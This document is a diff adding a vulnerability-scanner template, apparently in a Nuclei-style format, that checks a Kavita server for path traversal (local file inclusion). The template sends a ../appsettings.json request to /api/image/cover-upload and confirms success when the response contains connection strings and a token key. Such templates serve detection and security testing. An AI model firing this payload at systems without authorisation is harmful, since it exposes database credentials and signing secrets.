@@ -1,0 +1,27 @@
+id: kavita-lfi
+brief:
+    title: Kavita - Local File Inclusion
+    by: arafatansari
+    level: high
+    about: Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload.
+    label:
+        - kavita
+        - lfi
+        - huntr
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/image/cover-upload?filename=../appsettings.json'
+      signs:
+        - "on": word
+          has:
+            - '"ConnectionStrings":'
+            - '"Path":'
+            - '"TokenKey":'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
